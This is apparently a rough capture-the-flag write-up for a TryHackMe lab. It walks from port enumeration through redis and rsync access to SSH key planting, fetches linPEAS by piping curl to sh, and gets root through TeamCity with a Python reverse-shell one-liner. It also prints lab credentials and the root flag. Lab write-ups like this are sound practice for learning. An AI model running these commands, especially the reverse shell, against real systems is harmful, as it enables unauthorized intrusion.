analysing ports of namp scan serially: 


* SMBLIENT TO GET SERVICE FLAG
                    `smbclient -L \\10.10.247.180\`
                    
* RPCBIND TO GET SOME FILES
                   ` showmount -e 10.10.238.66 `
                    Export list for 10.10.238.66:
                    /opt/conf *
                    then mount the /opt/conf we get

                        ├── redis
                          └── redis.conf


                               redis.conf hints us to to use redis-cli and its pass was stored in the file redis-conf : "B65Hx562F@ggAZ@F"
                               redis-cli -h 10.10.35.239 -p 6379 -a B65Hx562F@ggAZ@F
                               then type : KEY * (to list all files)
                                    we get internal flag : DUMP "internal flag"
                                    and authlist which conatains a b64 encoded string that dedoce into "Hcg3HP67@TW@Bc72v" to be used in rsync.
                                    
* RSYNC (source to get into server via ssh) : use to just sync both devices in connection
                so with this we created ssh pub key and synced it int the ./ssh/authorized_keys
                   └─$ rsync -ahv --no-o --no-g  ~/.ssh/authorized_keys rsync://rsync-connect@10.10.247.180/files/sys-internal/.ssh/
                                                    (our file)                                                                  (target)
                                               now we can login into ssh server with the private key we have in accordnace to the public key we uploaded.
                                             
* SSH :
                      after login using ssh we get user.txt
                      in the / folder we get Theteamcity folder ..then scanned the vulnet system using linPEAS(# From github curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/
                      linpeas.sh | sh) using 
                      http server hosted on my localhost ( python3 -m http.server 6969) and then using wget to download linPEAS package on the vul-net (wget 10.0.2.15:6969/curl)  



     ->    these ports were suspicious:
              run by root-                                        127.0.0.1:631
                        tcp   LISTEN  0       100       [::ffff:127.0.0.1]:8111                 *

                        tcp   LISTEN  0       1         [::ffff:127.0.0.1]:8105                 

                   -scanned the ip using nmap and got two prts were open one with unkwon and other with skynet serrvice running.
                   then i needed to transfer these ports to my local system so that i can enumerate if a website was present. (ssh -i 1 -L 8111:my-ip:8111 sys-internal@box-ip) 
          GOT A WEBSITE:
                   it requires login credentials or a token to get in as a superuser.
                   there were nothing in the website login page (in sources , css,etc) 
                   so i jumped back in the teamcity folder present in vuln-net ssh server and done a recurrsive grep (grep -r "token" .)
                   got many tokens . so tried all and one was correct!
                   then i got a website with various stuffs.
                   ON enumerating the website i understoood thet i can write and run scripts from there..and since the ports were run by roots so the commands will be executed by roots .
                   so i ran script  (export RHOST="10.10.10.10";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));       
                   [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")')     to to get a shell on my systen using nc .
                   

cat /root/root.txt
THM{e8996faea46df09dba5676dd271c60bd}

